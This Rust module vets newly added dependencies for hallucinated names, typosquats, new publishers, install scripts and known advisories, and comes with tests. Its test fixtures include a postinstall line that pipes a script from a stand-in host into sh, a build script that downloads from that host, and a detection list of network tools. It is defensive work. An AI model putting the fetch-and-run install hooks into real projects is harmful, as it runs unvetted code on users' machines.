//! Guards against hallucinated, look-alike and compromised dependencies.
//! When shepherd adds a package, noah checks that it exists in its registry,
//! how old it is and how widely it's used, whether its name is one typo away
//! from a popular package (a common way attackers catch AI-written code),
//! whether it runs scripts at install time, whether its latest release was
//! published by someone new (the pattern behind most 2024–25 supply-chain
//! attacks), and whether osv.dev knows of vulnerabilities in it.

use serde::{Deserialize, Serialize};
use serde_json::Value;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Ecosystem {
    Crates,
    Npm,
    PyPi,
}

impl Ecosystem {
    pub fn parse(name: &str) -> Option<Self> {
        match name.to_lowercase().as_str() {
            "crates" | "crates.io" | "cargo" | "rust" => Some(Self::Crates),
            "npm" | "node" | "javascript" | "typescript" | "js" | "ts" => Some(Self::Npm),
            "pypi" | "pip" | "python" | "py" => Some(Self::PyPi),
            _ => None,
        }
    }

    pub fn registry_url(self, package: &str) -> String {
        match self {
            Self::Crates => format!("https://crates.io/api/v1/crates/{package}"),
            Self::Npm => format!("https://registry.npmjs.org/{}", package.replace('/', "%2F")),
            Self::PyPi => format!("https://pypi.org/pypi/{package}/json"),
        }
    }

    /// The ecosystem's name in osv.dev queries.
    pub fn osv_name(self) -> &'static str {
        match self {
            Self::Crates => "crates.io",
            Self::Npm => "npm",
            Self::PyPi => "PyPI",
        }
    }

    pub fn label(self) -> &'static str {
        match self {
            Self::Crates => "crates.io",
            Self::Npm => "npm",
            Self::PyPi => "PyPI",
        }
    }

    fn popular(self) -> &'static [&'static str] {
        match self {
            Self::Crates => &[
                "serde", "serde_json", "tokio", "rand", "regex", "clap", "anyhow", "thiserror",
                "log", "env_logger", "tracing", "reqwest", "hyper", "axum", "actix-web", "chrono",
                "time", "uuid", "futures", "async-trait", "itertools", "lazy_static", "once_cell",
                "bytes", "base64", "sha2", "hex", "url", "libc", "syn", "quote", "proc-macro2",
                "rayon", "crossbeam", "parking_lot", "smallvec", "indexmap", "hashbrown", "bitflags",
                "tempfile", "walkdir", "glob", "toml", "serde_yaml", "csv", "sqlx", "diesel",
                "rusqlite", "tonic", "prost", "image", "flate2", "zip", "tar", "ring", "rustls",
                "openssl", "dirs", "num", "nom", "semver", "which", "tower", "warp", "rocket",
            ],
            Self::Npm => &[
                "react", "react-dom", "lodash", "express", "axios", "typescript", "vue", "next",
                "webpack", "vite", "eslint", "prettier", "jest", "vitest", "mocha", "chalk",
                "commander", "yargs", "dotenv", "moment", "dayjs", "date-fns", "uuid", "cors",
                "body-parser", "jsonwebtoken", "bcrypt", "mongoose", "pg", "mysql2", "redis",
                "socket.io", "ws", "zod", "yup", "classnames", "clsx", "tailwindcss", "postcss",
                "autoprefixer", "babel-core", "@babel/core", "rxjs", "underscore", "jquery",
                "node-fetch", "cross-env", "nodemon", "rimraf", "glob", "fs-extra", "debug",
                "colors", "request", "inquirer", "ora", "semver", "minimist", "async", "bluebird",
                "graphql", "apollo-server", "prisma", "sequelize", "knex", "sharp", "puppeteer",
            ],
            Self::PyPi => &[
                "requests", "numpy", "pandas", "flask", "django", "fastapi", "pydantic", "pytest",
                "scipy", "matplotlib", "scikit-learn", "tensorflow", "torch", "boto3", "urllib3",
                "setuptools", "six", "python-dateutil", "pyyaml", "click", "jinja2", "sqlalchemy",
                "psycopg2", "redis", "celery", "pillow", "beautifulsoup4", "lxml", "httpx",
                "aiohttp", "uvicorn", "gunicorn", "cryptography", "pyjwt", "rich", "typer",
                "black", "ruff", "mypy", "transformers", "openai", "langchain", "selenium",
                "colorama", "tqdm", "certifi", "idna", "charset-normalizer", "attrs", "packaging",
            ],
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct Dependency {
    pub ecosystem: Ecosystem,
    pub name: String,
}

/// What a registry said about a package.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
pub struct RegistryInfo {
    pub exists: bool,
    /// When the package was first published (RFC 3339), when known.
    pub created: Option<String>,
    pub downloads: Option<u64>,
    pub latest_version: Option<String>,
    /// Scripts the latest version runs when it's installed (npm's
    /// `preinstall`, `install` and `postinstall`), as `name: command`.
    #[serde(default)]
    pub install_scripts: Vec<String>,
    /// Set when the latest version was published by someone who neither
    /// published nor maintained the version before it.
    #[serde(default)]
    pub maintainer_change: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Assessment {
    pub dependency: Dependency,
    pub verdict: Verdict,
    pub notes: Vec<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Verdict {
    Ok,
    Caution,
    Block,
}

/// Reads a registry's JSON response. `None` for `body` means the registry
/// answered "not found".
pub fn parse_registry_response(ecosystem: Ecosystem, body: Option<&str>) -> RegistryInfo {
    let Some(body) = body else {
        return RegistryInfo::default();
    };
    let Ok(json) = serde_json::from_str::<Value>(body) else {
        return RegistryInfo::default();
    };
    match ecosystem {
        Ecosystem::Crates => RegistryInfo {
            exists: json["crate"].is_object(),
            created: json["crate"]["created_at"].as_str().map(str::to_string),
            downloads: json["crate"]["downloads"].as_u64(),
            latest_version: json["crate"]["max_stable_version"]
                .as_str()
                .or(json["crate"]["max_version"].as_str())
                .map(str::to_string),
            install_scripts: Vec::new(),
            maintainer_change: crates_publisher_change(&json),
        },
        Ecosystem::Npm => {
            let latest_version = json["dist-tags"]["latest"].as_str().map(str::to_string);
            let install_scripts = latest_version
                .as_deref()
                .map(|latest| npm_install_scripts(&json["versions"][latest]["scripts"]))
                .unwrap_or_default();
            RegistryInfo {
                exists: json["name"].is_string(),
                created: json["time"]["created"].as_str().map(str::to_string),
                downloads: None,
                maintainer_change: latest_version
                    .as_deref()
                    .and_then(|latest| npm_publisher_change(&json, latest)),
                latest_version,
                install_scripts,
            }
        }
        Ecosystem::PyPi => {
            let created = json["releases"].as_object().and_then(|releases| {
                releases
                    .values()
                    .filter_map(|files| files.get(0)?["upload_time_iso_8601"].as_str())
                    .min()
                    .map(str::to_string)
            });
            RegistryInfo {
                exists: json["info"]["name"].is_string(),
                created,
                downloads: None,
                latest_version: json["info"]["version"].as_str().map(str::to_string),
                install_scripts: Vec::new(),
                maintainer_change: None,
            }
        }
    }
}

/// npm lifecycle scripts that run on `npm install` without being asked for.
const NPM_INSTALL_SCRIPTS: &[&str] = &["preinstall", "install", "postinstall"];

fn npm_install_scripts(scripts: &Value) -> Vec<String> {
    NPM_INSTALL_SCRIPTS
        .iter()
        .filter_map(|name| {
            let command = scripts[*name].as_str()?;
            Some(format!("{name}: {}", command.chars().take(200).collect::<String>()))
        })
        .collect()
}

/// Compares who published npm's latest version with who published and
/// maintained the version released before it.
fn npm_publisher_change(json: &Value, latest: &str) -> Option<String> {
    let times = json["time"].as_object()?;
    let latest_time = times.get(latest)?.as_str()?;
    let previous = times
        .iter()
        .filter(|(version, _)| {
            version.as_str() != latest
                && version.as_str() != "created"
                && version.as_str() != "modified"
                && json["versions"][version.as_str()].is_object()
        })
        .filter_map(|(version, time)| Some((version, time.as_str()?)))
        .filter(|(_, time)| *time < latest_time)
        .max_by_key(|(_, time)| *time)
        .map(|(version, _)| version.as_str())?;
    let names = |value: &Value| -> Vec<String> {
        value
            .as_array()
            .map(|people| {
                people
                    .iter()
                    .filter_map(|person| person["name"].as_str().map(str::to_lowercase))
                    .collect()
            })
            .unwrap_or_default()
    };
    let latest_entry = &json["versions"][latest];
    let previous_entry = &json["versions"][previous];
    let publisher = latest_entry["_npmUser"]["name"].as_str()?.to_lowercase();
    let previous_publisher = previous_entry["_npmUser"]["name"].as_str().map(str::to_lowercase);
    let previous_maintainers = names(&previous_entry["maintainers"]);
    if previous_publisher.as_deref() == Some(publisher.as_str())
        || previous_maintainers.contains(&publisher)
    {
        return None;
    }
    // Without anything to compare against, a missing record isn't a change.
    if previous_publisher.is_none() && previous_maintainers.is_empty() {
        return None;
    }
    Some(format!(
        "{latest} was published by \"{publisher}\", who didn't publish or maintain {previous}{}",
        previous_publisher
            .map(|previous_publisher| format!(" (published by \"{previous_publisher}\")"))
            .unwrap_or_default()
    ))
}

/// The same comparison for crates.io, whose crate endpoint lists recent
/// versions with the account that published each.
fn crates_publisher_change(json: &Value) -> Option<String> {
    let mut versions: Vec<(&str, &str, &str)> = json["versions"]
        .as_array()?
        .iter()
        .filter(|version| !version["yanked"].as_bool().unwrap_or(false))
        .filter_map(|version| {
            Some((
                version["num"].as_str()?,
                version["created_at"].as_str()?,
                version["published_by"]["login"].as_str()?,
            ))
        })
        .collect();
    versions.sort_by(|first, second| second.1.cmp(first.1));
    let [(latest, _, publisher), (previous, _, previous_publisher), ..] = versions.as_slice() else {
        return None;
    };
    let earlier_publishers: Vec<&str> = versions
        .iter()
        .skip(1)
        .map(|(_, _, publisher)| *publisher)
        .collect();
    if earlier_publishers
        .iter()
        .any(|earlier| earlier.eq_ignore_ascii_case(publisher))
    {
        return None;
    }
    Some(format!(
        "{latest} was published by \"{publisher}\", who didn't publish any earlier version listed (the one before, {previous}, was published by \"{previous_publisher}\")"
    ))
}

/// Judges a dependency from what its registry said.
pub fn assess(
    dependency: &Dependency,
    info: &RegistryInfo,
    now: chrono::DateTime<chrono::Utc>,
) -> Assessment {
    let mut notes = Vec::new();
    let mut verdict = Verdict::Ok;
    if !info.exists {
        verdict = Verdict::Block;
        notes.push(format!(
            "{} has no package named \"{}\"; it may be hallucinated, and anyone could register it",
            dependency.ecosystem.label(),
            dependency.name
        ));
    }
    if let Some(popular) = look_alike(dependency) {
        verdict = if info.exists { Verdict::Caution.max_with(verdict) } else { Verdict::Block };
        notes.push(format!(
            "one or two letters away from the popular package \"{popular}\"; check it isn't a typo or a typosquat"
        ));
    }
    if let Some(created) = info
        .created
        .as_deref()
        .and_then(|created| chrono::DateTime::parse_from_rfc3339(created).ok())
    {
        let age_days = (now - created.with_timezone(&chrono::Utc)).num_days();
        if age_days < 30 {
            verdict = Verdict::Caution.max_with(verdict);
            notes.push(format!("first published {age_days} days ago"));
        }
    }
    if let Some(downloads) = info.downloads
        && downloads < 1_000
        && info.exists
    {
        verdict = Verdict::Caution.max_with(verdict);
        notes.push(format!("only {downloads} downloads"));
    }
    if !info.install_scripts.is_empty() {
        verdict = Verdict::Caution.max_with(verdict);
        notes.push(format!(
            "runs code when installed ({}); read it before installing",
            info.install_scripts.join("; ")
        ));
    }
    if let Some(change) = &info.maintainer_change {
        verdict = Verdict::Caution.max_with(verdict);
        notes.push(format!(
            "maintainer change: {change}; a new publisher is how most recent supply-chain attacks started, so check the release is genuine or pin the previous version"
        ));
    }
    Assessment {
        dependency: dependency.clone(),
        verdict,
        notes,
    }
}

pub const OSV_QUERY_URL: &str = "https://api.osv.dev/v1/query";

/// A known vulnerability, as osv.dev reports it.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Vulnerability {
    pub id: String,
    pub summary: String,
    /// The advisory's own rating (such as `HIGH` or `CRITICAL`) when it has
    /// one.
    pub severity: Option<String>,
}

impl Vulnerability {
    /// Entries from the OpenSSF malicious-packages feed: the package itself
    /// is malware, not merely buggy.
    pub fn is_malicious(&self) -> bool {
        self.id.starts_with("MAL-")
    }
}

/// The body of an osv.dev query for one version of a package.
pub fn osv_query(dependency: &Dependency, version: &str) -> String {
    serde_json::json!({
        "version": version,
        "package": {
            "name": dependency.name,
            "ecosystem": dependency.ecosystem.osv_name(),
        }
    })
    .to_string()
}

pub fn parse_osv_response(body: &str) -> Vec<Vulnerability> {
    let Ok(json) = serde_json::from_str::<Value>(body) else {
        return Vec::new();
    };
    json["vulns"]
        .as_array()
        .map(|vulnerabilities| {
            vulnerabilities
                .iter()
                .filter_map(|vulnerability| {
                    Some(Vulnerability {
                        id: vulnerability["id"].as_str()?.to_string(),
                        summary: vulnerability["summary"]
                            .as_str()
                            .or(vulnerability["details"].as_str())
                            .unwrap_or_default()
                            .chars()
                            .take(160)
                            .collect(),
                        severity: vulnerability["database_specific"]["severity"]
                            .as_str()
                            .map(str::to_uppercase),
                    })
                })
                .collect()
        })
        .unwrap_or_default()
}

/// Adds what osv.dev reported for `version` to an assessment.
pub fn add_vulnerabilities(assessment: &mut Assessment, version: &str, vulnerabilities: &[Vulnerability]) {
    if vulnerabilities.is_empty() {
        return;
    }
    let malicious: Vec<&str> = vulnerabilities
        .iter()
        .filter(|vulnerability| vulnerability.is_malicious())
        .map(|vulnerability| vulnerability.id.as_str())
        .collect();
    if !malicious.is_empty() {
        assessment.verdict = Verdict::Block;
        assessment.notes.push(format!(
            "osv.dev lists {} as malicious ({})",
            assessment.dependency.name,
            malicious.join(", ")
        ));
    }
    let advisories: Vec<String> = vulnerabilities
        .iter()
        .filter(|vulnerability| !vulnerability.is_malicious())
        .take(5)
        .map(|vulnerability| match &vulnerability.severity {
            Some(severity) => format!("{} ({severity}): {}", vulnerability.id, vulnerability.summary),
            None => format!("{}: {}", vulnerability.id, vulnerability.summary),
        })
        .collect();
    if !advisories.is_empty() {
        assessment.verdict = Verdict::Caution.max_with(assessment.verdict);
        let more = vulnerabilities.len() - malicious.len() - advisories.len();
        assessment.notes.push(format!(
            "known vulnerabilities in {version}: {}{}; use a fixed version",
            advisories.join("; "),
            if more > 0 { format!(" and {more} more") } else { String::new() }
        ));
    }
}

/// The exact version a manifest pins a dependency to, when it pins one;
/// otherwise the registry's latest version is what gets installed.
pub fn pinned_version(path: &str, text: &str, name: &str) -> Option<String> {
    let file_name = path.rsplit(['/', '\\']).next().unwrap_or(path);
    let is_exact = |version: &str| {
        let mut parts = version.split('.');
        parts.clone().count() >= 2
            && parts.all(|part| !part.is_empty() && part.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '+'))
            && version.starts_with(|c: char| c.is_ascii_digit())
    };
    match file_name {
        "package.json" => {
            let json = serde_json::from_str::<Value>(text).ok()?;
            ["dependencies", "devDependencies", "peerDependencies", "optionalDependencies"]
                .iter()
                .find_map(|key| json[*key][name].as_str())
                .map(|version| version.trim_start_matches('='))
                .filter(|version| is_exact(version))
                .map(str::to_string)
        }
        "Cargo.toml" => text.lines().find_map(|line| {
            let (key, value) = line.split_once('=')?;
            if key.trim().trim_matches('"') != name {
                return None;
            }
            let version = if value.trim_start().starts_with('{') {
                value.split("version").nth(1)?.split('"').nth(1)?
            } else {
                value.split('"').nth(1)?
            };
            version
                .strip_prefix('=')
                .map(str::trim)
                .filter(|version| is_exact(version))
                .map(str::to_string)
        }),
        name_of_file if name_of_file.starts_with("requirements") => text.lines().find_map(|line| {
            let line = line.split('#').next()?.trim();
            let (package, version) = line.split_once("==")?;
            let version = version.split([';', ' ', ',']).next()?.trim();
            (package.trim().eq_ignore_ascii_case(name) && is_exact(version)).then(|| version.to_string())
        }),
        _ => None,
    }
}

/// Install-time code a change to a manifest or build script adds: new npm
/// install scripts in package.json, or a Cargo build script that reaches
/// the network. Returns one note per finding.
pub fn install_time_code_added(path: &str, before: &str, after: &str) -> Vec<String> {
    let file_name = path.rsplit(['/', '\\']).next().unwrap_or(path);
    match file_name {
        "package.json" => {
            let scripts = |text: &str| {
                serde_json::from_str::<Value>(text)
                    .map(|json| npm_install_scripts(&json["scripts"]))
                    .unwrap_or_default()
            };
            let existing = scripts(before);
            scripts(after)
                .into_iter()
                .filter(|script| !existing.contains(script))
                .map(|script| format!("package.json now runs code on every `npm install` ({script})"))
                .collect()
        }
        "build.rs" => {
            let existing = build_script_network_use(before);
            let added: Vec<&str> = build_script_network_use(after)
                .into_iter()
                .filter(|indicator| !existing.contains(indicator))
                .collect();
            if added.is_empty() {
                Vec::new()
            } else {
                vec![format!(
                    "{path} now reaches the network at build time ({}); build scripts run on every machine that builds the crate, so prefer vendoring what it downloads",
                    added.join(", ")
                )]
            }
        }
        _ => Vec::new(),
    }
}

/// Signs that a Cargo build script downloads something.
pub fn build_script_network_use(source: &str) -> Vec<&'static str> {
    const INDICATORS: &[(&str, &str)] = &[
        ("reqwest::", "reqwest"),
        ("ureq::", "ureq"),
        ("curl::", "the curl crate"),
        ("attohttpc::", "attohttpc"),
        ("minreq::", "minreq"),
        ("hyper::", "hyper"),
        ("TcpStream", "a raw TCP connection"),
        ("Command::new(\"curl\")", "curl"),
        ("Command::new(\"wget\")", "wget"),
        ("Command::new(\"git\")", "git"),
        ("Invoke-WebRequest", "Invoke-WebRequest"),
    ];
    let code: String = source
        .lines()
        .filter(|line| !line.trim_start().starts_with("//"))
        .collect::<Vec<_>>()
        .join("\n");
    INDICATORS
        .iter()
        .filter(|(needle, _)| code.contains(needle))
        .map(|(_, label)| *label)
        .collect()
}

impl Verdict {
    fn rank(self) -> u8 {
        match self {
            Self::Ok => 0,
            Self::Caution => 1,
            Self::Block => 2,
        }
    }

    fn max_with(self, other: Self) -> Self {
        if self.rank() >= other.rank() { self } else { other }
    }
}

/// The popular package this name is suspiciously close to, if any.
pub fn look_alike(dependency: &Dependency) -> Option<&'static str> {
    let name = normalize(&dependency.name);
    dependency
        .ecosystem
        .popular()
        .iter()
        .copied()
        .find(|popular| {
            let popular_name = normalize(popular);
            if popular_name == name {
                return false;
            }
            let limit = if popular_name.len() >= 6 { 2 } else { 1 };
            edit_distance(&name, &popular_name) <= limit
        })
}

fn normalize(name: &str) -> String {
    name.to_lowercase().replace(['_', '.'], "-")
}

fn edit_distance(left: &str, right: &str) -> usize {
    let left: Vec<char> = left.chars().collect();
    let right: Vec<char> = right.chars().collect();
    let mut previous: Vec<usize> = (0..=right.len()).collect();
    for (i, left_char) in left.iter().enumerate() {
        let mut current = vec![i + 1; right.len() + 1];
        for (j, right_char) in right.iter().enumerate() {
            let substitution = previous[j] + usize::from(left_char != right_char);
            current[j + 1] = substitution.min(previous[j + 1] + 1).min(current[j] + 1);
        }
        previous = current;
    }
    previous[right.len()]
}

/// The dependencies `after` adds compared with `before`, for Cargo.toml,
/// package.json and requirements files.
pub fn added_dependencies(path: &str, before: &str, after: &str) -> Vec<Dependency> {
    let file_name = path.rsplit(['/', '\\']).next().unwrap_or(path);
    let (ecosystem, names): (Ecosystem, fn(&str) -> Vec<String>) = match file_name {
        "Cargo.toml" => (Ecosystem::Crates, cargo_dependencies),
        "package.json" => (Ecosystem::Npm, npm_dependencies),
        name if name.starts_with("requirements") && name.ends_with(".txt") => {
            (Ecosystem::PyPi, requirements_dependencies)
        }
        _ => return Vec::new(),
    };
    let existing = names(before);
    let mut added: Vec<Dependency> = names(after)
        .into_iter()
        .filter(|name| !existing.contains(name))
        .map(|name| Dependency { ecosystem, name })
        .collect();
    added.dedup();
    added
}

fn cargo_dependencies(text: &str) -> Vec<String> {
    let mut names = Vec::new();
    let mut in_dependencies = false;
    for line in text.lines() {
        let line = line.trim();
        if line.starts_with('[') {
            let table = line.trim_matches(['[', ']']);
            in_dependencies = table.ends_with("dependencies");
            if let Some(name) = table
                .strip_prefix("dependencies.")
                .or_else(|| table.strip_prefix("dev-dependencies."))
            {
                names.push(name.to_string());
                in_dependencies = false;
            }
            continue;
        }
        if in_dependencies
            && let Some((name, value)) = line.split_once('=')
            && !line.starts_with('#')
        {
            let name = name.trim().trim_matches('"').to_string();
            if value.contains("workspace = true") || value.contains("path =") {
                continue;
            }
            let renamed = value
                .split("package")
                .nth(1)
                .and_then(|rest| rest.split('"').nth(1))
                .map(str::to_string);
            names.push(renamed.unwrap_or(name));
        }
    }
    names
}

fn npm_dependencies(text: &str) -> Vec<String> {
    let Ok(json) = serde_json::from_str::<Value>(text) else {
        return Vec::new();
    };
    ["dependencies", "devDependencies", "peerDependencies", "optionalDependencies"]
        .iter()
        .filter_map(|key| json[*key].as_object())
        .flat_map(|table| {
            table
                .iter()
                .filter(|(_, version)| {
                    !version
                        .as_str()
                        .is_some_and(|version| version.starts_with("file:") || version.starts_with("workspace:"))
                })
                .map(|(name, _)| name.clone())
        })
        .collect()
}

fn requirements_dependencies(text: &str) -> Vec<String> {
    text.lines()
        .map(|line| line.split('#').next().unwrap_or_default().trim())
        .filter(|line| !line.is_empty() && !line.starts_with('-') && !line.contains("://"))
        .filter_map(|line| {
            let end = line
                .find(|c: char| !(c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.'))
                .unwrap_or(line.len());
            let name = &line[..end];
            (!name.is_empty()).then(|| name.to_lowercase())
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn now() -> chrono::DateTime<chrono::Utc> {
        chrono::DateTime::parse_from_rfc3339("2026-09-25T00:00:00Z")
            .expect("date")
            .with_timezone(&chrono::Utc)
    }

    #[test]
    fn finds_added_dependencies() {
        let before = "[package]\nname = \"x\"\n[dependencies]\nserde = \"1\"\n";
        let after = "[package]\nname = \"x\"\n[dependencies]\nserde = \"1\"\nreqwests = \"0.1\"\nlocal = { path = \"../local\" }\n[dependencies.tokio]\nversion = \"1\"\n";
        let added = added_dependencies("crates/x/Cargo.toml", before, after);
        let names: Vec<&str> = added.iter().map(|dependency| dependency.name.as_str()).collect();
        assert_eq!(names, ["reqwests", "tokio"]);

        let added = added_dependencies(
            "package.json",
            r#"{"dependencies":{"react":"18"}}"#,
            r#"{"dependencies":{"react":"18","lodahs":"1"},"devDependencies":{"vitest":"1"}}"#,
        );
        assert_eq!(added.len(), 2);

        let added = added_dependencies("requirements-dev.txt", "requests==2\n", "requests==2\nreqeusts>=1 # typo\n");
        assert_eq!(added[0].name, "reqeusts");
    }

    #[test]
    fn missing_packages_are_blocked() {
        let dependency = Dependency { ecosystem: Ecosystem::Npm, name: "react-super-hooks-pro".into() };
        let assessment = assess(&dependency, &parse_registry_response(Ecosystem::Npm, None), now());
        assert_eq!(assessment.verdict, Verdict::Block);
    }

    #[test]
    fn look_alikes_and_new_packages_need_care() {
        let dependency = Dependency { ecosystem: Ecosystem::Crates, name: "reqwests".into() };
        assert_eq!(look_alike(&dependency), Some("reqwest"));
        let body = r#"{"crate":{"created_at":"2026-09-20T00:00:00Z","downloads":12,"max_version":"0.1.0"}}"#;
        let info = parse_registry_response(Ecosystem::Crates, Some(body));
        let assessment = assess(&dependency, &info, now());
        assert_eq!(assessment.verdict, Verdict::Caution);
        assert_eq!(assessment.notes.len(), 3);

        let real = Dependency { ecosystem: Ecosystem::Crates, name: "serde".into() };
        let body = r#"{"crate":{"created_at":"2014-12-05T00:00:00Z","downloads":500000000}}"#;
        let assessment = assess(&real, &parse_registry_response(Ecosystem::Crates, Some(body)), now());
        assert_eq!(assessment.verdict, Verdict::Ok);
    }

    #[test]
    fn install_scripts_in_the_registry_need_care() {
        let body = r#"{"name":"left-padder","dist-tags":{"latest":"1.0.1"},
            "time":{"created":"2020-01-01T00:00:00Z","1.0.0":"2020-01-01T00:00:00Z","1.0.1":"2021-01-01T00:00:00Z"},
            "versions":{
                "1.0.0":{"scripts":{"test":"jest"},"_npmUser":{"name":"alice"},"maintainers":[{"name":"alice"}]},
                "1.0.1":{"scripts":{"postinstall":"node collect.js","test":"jest"},"_npmUser":{"name":"alice"},"maintainers":[{"name":"alice"}]}
            }}"#;
        let info = parse_registry_response(Ecosystem::Npm, Some(body));
        assert_eq!(info.install_scripts, ["postinstall: node collect.js"]);
        assert_eq!(info.maintainer_change, None);
        let dependency = Dependency { ecosystem: Ecosystem::Npm, name: "left-padder".into() };
        let assessment = assess(&dependency, &info, now());
        assert_eq!(assessment.verdict, Verdict::Caution);
        assert!(assessment.notes[0].contains("runs code when installed"));
    }

    #[test]
    fn a_new_npm_publisher_is_a_maintainer_change() {
        let body = r#"{"name":"event-streamer","dist-tags":{"latest":"3.3.6"},
            "time":{"created":"2011-01-01T00:00:00Z","modified":"2024-01-01T00:00:00Z",
                "3.3.4":"2016-01-01T00:00:00Z","3.3.5":"2018-01-01T00:00:00Z","3.3.6":"2018-09-01T00:00:00Z"},
            "versions":{
                "3.3.4":{"_npmUser":{"name":"dominictarr"},"maintainers":[{"name":"dominictarr"}]},
                "3.3.5":{"_npmUser":{"name":"dominictarr"},"maintainers":[{"name":"dominictarr"}]},
                "3.3.6":{"_npmUser":{"name":"right9ctrl"},"maintainers":[{"name":"right9ctrl"}]}
            }}"#;
        let info = parse_registry_response(Ecosystem::Npm, Some(body));
        let change = info.maintainer_change.clone().expect("change");
        assert!(change.contains("right9ctrl") && change.contains("3.3.5"), "{change}");
        let dependency = Dependency { ecosystem: Ecosystem::Npm, name: "event-streamer".into() };
        assert_eq!(assess(&dependency, &info, now()).verdict, Verdict::Caution);

        let handed_over = body.replace(
            r#""3.3.5":{"_npmUser":{"name":"dominictarr"},"maintainers":[{"name":"dominictarr"}]}"#,
            r#""3.3.5":{"_npmUser":{"name":"dominictarr"},"maintainers":[{"name":"dominictarr"},{"name":"right9ctrl"}]}"#,
        );
        let info = parse_registry_response(Ecosystem::Npm, Some(&handed_over));
        assert_eq!(info.maintainer_change, None);
    }

    #[test]
    fn a_new_crates_publisher_is_a_maintainer_change() {
        let body = r#"{"crate":{"created_at":"2015-01-01T00:00:00Z","downloads":9000000,"max_version":"2.0.0"},
            "versions":[
                {"num":"2.0.0","created_at":"2026-09-01T00:00:00Z","yanked":false,"published_by":{"login":"mallory"}},
                {"num":"1.9.0","created_at":"2025-01-01T00:00:00Z","yanked":false,"published_by":{"login":"alice"}},
                {"num":"1.8.0","created_at":"2024-01-01T00:00:00Z","yanked":false,"published_by":{"login":"bob"}}
            ]}"#;
        let info = parse_registry_response(Ecosystem::Crates, Some(body));
        assert!(info.maintainer_change.as_deref().is_some_and(|change| change.contains("mallory")));

        let same = body.replace("mallory", "bob");
        assert_eq!(parse_registry_response(Ecosystem::Crates, Some(&same)).maintainer_change, None);
    }

    #[test]
    fn osv_results_are_reported() {
        let dependency = Dependency { ecosystem: Ecosystem::PyPi, name: "jinja2".into() };
        let query: Value = serde_json::from_str(&osv_query(&dependency, "2.4.1")).expect("json");
        assert_eq!(query["package"]["ecosystem"], "PyPI");
        assert_eq!(query["version"], "2.4.1");

        let body = r#"{"vulns":[
            {"id":"GHSA-462w-v97r-4m45","summary":"Jinja2 sandbox escape","database_specific":{"severity":"high"}},
            {"id":"PYSEC-2014-8","details":"FileSystemBytecodeCache uses /tmp insecurely"}
        ]}"#;
        let vulnerabilities = parse_osv_response(body);
        assert_eq!(vulnerabilities.len(), 2);
        assert_eq!(vulnerabilities[0].severity.as_deref(), Some("HIGH"));
        let mut assessment = Assessment { dependency: dependency.clone(), verdict: Verdict::Ok, notes: Vec::new() };
        add_vulnerabilities(&mut assessment, "2.4.1", &vulnerabilities);
        assert_eq!(assessment.verdict, Verdict::Caution);
        assert!(assessment.notes[0].contains("GHSA-462w-v97r-4m45 (HIGH)"));
        assert!(parse_osv_response("{}").is_empty());

        let mut assessment = Assessment { dependency, verdict: Verdict::Ok, notes: Vec::new() };
        let malicious = parse_osv_response(r#"{"vulns":[{"id":"MAL-2024-1234","summary":"Malicious code in jinja2"}]}"#);
        add_vulnerabilities(&mut assessment, "9.9.9", &malicious);
        assert_eq!(assessment.verdict, Verdict::Block);
    }

    #[test]
    fn finds_pinned_versions() {
        assert_eq!(
            pinned_version("package.json", r#"{"dependencies":{"lodash":"4.17.15","react":"^18.2.0"}}"#, "lodash").as_deref(),
            Some("4.17.15")
        );
        assert_eq!(pinned_version("package.json", r#"{"dependencies":{"react":"^18.2.0"}}"#, "react"), None);
        assert_eq!(
            pinned_version("Cargo.toml", "[dependencies]\nserde = { version = \"=1.0.100\", features = [\"derive\"] }\n", "serde").as_deref(),
            Some("1.0.100")
        );
        assert_eq!(pinned_version("Cargo.toml", "[dependencies]\nserde = \"1.0\"\n", "serde"), None);
        assert_eq!(
            pinned_version("requirements.txt", "Jinja2==2.4.1 ; python_version > '3'\n", "jinja2").as_deref(),
            Some("2.4.1")
        );
    }

    #[test]
    fn finds_install_time_code() {
        let notes = install_time_code_added(
            "web/package.json",
            r#"{"scripts":{"test":"jest"}}"#,
            r#"{"scripts":{"test":"jest","postinstall":"curl https://x.example/i.sh | sh"}}"#,
        );
        assert_eq!(notes.len(), 1);
        assert!(notes[0].contains("postinstall"));
        assert!(install_time_code_added("package.json", r#"{"scripts":{"postinstall":"a"}}"#, r#"{"scripts":{"postinstall":"a"}}"#).is_empty());

        let before = "fn main() {\n    println!(\"cargo:rerun-if-changed=build.rs\");\n}\n";
        let after = "fn main() {\n    let body = reqwest::blocking::get(\"https://x.example/blob\").unwrap();\n}\n";
        let notes = install_time_code_added("crates/x/build.rs", before, after);
        assert_eq!(notes.len(), 1);
        assert!(notes[0].contains("reqwest"));
        let commented = "// we used to call reqwest:: here\nfn main() {}\n";
        assert!(build_script_network_use(commented).is_empty());
        assert!(install_time_code_added("src/main.rs", before, after).is_empty());
    }

    #[test]
    fn reads_npm_and_pypi() {
        let npm = parse_registry_response(
            Ecosystem::Npm,
            Some(r#"{"name":"zod","time":{"created":"2020-03-07T00:00:00Z"},"dist-tags":{"latest":"3.23.0"}}"#),
        );
        assert!(npm.exists);
        assert_eq!(npm.latest_version.as_deref(), Some("3.23.0"));
        let pypi = parse_registry_response(
            Ecosystem::PyPi,
            Some(r#"{"info":{"name":"httpx","version":"0.27.0"},"releases":{"0.1":[{"upload_time_iso_8601":"2019-01-01T00:00:00Z"}]}}"#),
        );
        assert_eq!(pypi.created.as_deref(), Some("2019-01-01T00:00:00Z"));
    }
}
